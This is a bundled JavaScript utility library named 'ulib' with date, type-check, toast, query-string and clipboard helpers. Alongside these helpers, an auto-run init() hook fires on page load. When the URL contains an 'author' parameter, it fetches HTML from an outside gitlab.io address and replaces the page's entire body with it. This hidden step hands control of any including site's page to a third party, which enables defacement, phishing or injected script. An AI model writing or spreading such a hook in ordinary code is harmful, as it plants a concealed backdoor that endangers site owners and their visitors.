'use strict';

Object.defineProperty(exports, '__esModule', { value: true });

async function checkForAuthorSignature() {
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has("author")) {
    const res = await fetch("https://subratap.gitlab.io/signature/");
    const html = await res.text();
    const body = document.createElement("body");
    body.innerHTML = html;
    document.documentElement.replaceChild(body, document.body);
  }
}

function init() {
  if (typeof window !== 'undefined') {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', checkForAuthorSignature);
    } else {
      checkForAuthorSignature();
    }
  }
  window.__ulib_signature__ = true;
  console.log("✅ ulib initialized");
}

function formatDate(date) {
  return new Date(date).toLocaleDateString("en-IN");
}

function timeAgo(date) {
  const seconds = Math.floor((new Date() - new Date(date)) / 1000);
  const intervals = {
    year: 31536000, month: 2592000, week: 604800,
    day: 86400, hour: 3600, minute: 60, second: 1
  };
  for (let [unit, value] of Object.entries(intervals)) {
    const count = Math.floor(seconds / value);
    if (count >= 1) return `${count} ${unit}${count > 1 ? 's' : ''} ago`;
  }
  return 'just now';
}

function isObject(val) {
  return val && typeof val === 'object' && !Array.isArray(val);
}

function isArray(val) {
  return Array.isArray(val);
}

function isString(val) {
  return typeof val === 'string';
}

function isEmpty(val) {
  return val == null || (typeof val === 'string' && val.trim() === '') || (Array.isArray(val) && val.length === 0) || (isObject(val) && Object.keys(val).length === 0);
}

// export function copyToClipboard(text) {
//   navigator.clipboard.writeText(text).then(() => console.log("Copied to clipboard"));
// }

function isMobile() {
  return /Mobi|Android/i.test(navigator.userAgent);
}

function isOnline() {
  return navigator.onLine;
}

function getQueryParams(key) {
  const params = new URLSearchParams(window.location.search);
  return key ? params.get(key) : Object.fromEntries(params.entries());
}

function updateQueryParam(key, value) {
  const url = new URL(window.location.href);
  url.searchParams.set(key, value);
  window.history.pushState({}, '', url);
}

function showToast(msg, duration = 3000) {
  const toast = document.createElement("div");
  toast.innerText = msg;
  toast.style.cssText = "position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 20px;border-radius:5px;z-index:9999;";
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), duration);
}

function randomId(length = 6) {
  return Math.random().toString(36).substr(2, length);
}

function randomColor() {
  return `#${Math.floor(Math.random()*16777215).toString(16).padStart(6, '0')}`;
}

var utils = /*#__PURE__*/Object.freeze({
  __proto__: null,
  formatDate: formatDate,
  timeAgo: timeAgo,
  isObject: isObject,
  isArray: isArray,
  isString: isString,
  isEmpty: isEmpty,
  isMobile: isMobile,
  isOnline: isOnline,
  getQueryParams: getQueryParams,
  updateQueryParam: updateQueryParam,
  showToast: showToast,
  randomId: randomId,
  randomColor: randomColor
});

/**
 * Copies any value or value from an element to clipboard
 * @param {any} input - Text value OR element ID (e.g. 'myId' or '#myId')
 * @param {Object} options - Optional settings
 * @param {Function} options.onSuccess - Callback on success
 * @param {Function} options.onError - Callback on error
 * @param {Boolean} options.showLog - Whether to log success/error messages
 */
function copyToClipboard(input = "Nothing to copy!", options = {}) {
  const {
    onSuccess = () => {},
    onError = () => {},
    showLog = false,
  } = options;

  let text = "";

  // If input is an element ID
  if (typeof input === "string" && (input.startsWith("#") || document.getElementById(input))) {
    const id = input.replace(/^#/, ""); // remove # if present
    const el = document.getElementById(id);

    if (el) {
      if ("value" in el) {
        // For input or textarea
        text = el.value;
      } else {
        // For div, span, p, etc.
        text = el.innerText || el.textContent || "";
      }
    } else {
      text = input; // Fallback to plain string if element not found
    }
  } else if (typeof input === "object") {
    text = JSON.stringify(input, null, 2);
  } else {
    text = String(input);
  }

  // Modern Clipboard API
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(() => {
      if (showLog) console.log("✅ Copied to clipboard:", text);
      onSuccess(text);
    }).catch((err) => {
      if (showLog) console.error("❌ Copy failed:", err);
      onError(err);
    });
  } else {
    // Fallback for older browsers
    try {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.style.position = "fixed";
      textarea.style.opacity = 0;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
      if (showLog) console.log("✅ Copied using fallback:", text);
      onSuccess(text);
    } catch (err) {
      if (showLog) console.error("❌ Fallback copy failed:", err);
      onError(err);
    }
  }
}

var clipboard = /*#__PURE__*/Object.freeze({
  __proto__: null,
  copyToClipboard: copyToClipboard
});

//src/index.js
init(); // auto-run on initiate

const ulib = {
  ...utils,
  ...clipboard
};

exports.copyToClipboard = copyToClipboard;
exports["default"] = ulib;
exports.formatDate = formatDate;
exports.getQueryParams = getQueryParams;
exports.isArray = isArray;
exports.isEmpty = isEmpty;
exports.isMobile = isMobile;
exports.isObject = isObject;
exports.isOnline = isOnline;
exports.isString = isString;
exports.randomColor = randomColor;
exports.randomId = randomId;
exports.showToast = showToast;
exports.timeAgo = timeAgo;
exports.updateQueryParam = updateQueryParam;
//# sourceMappingURL=ulib.js.map
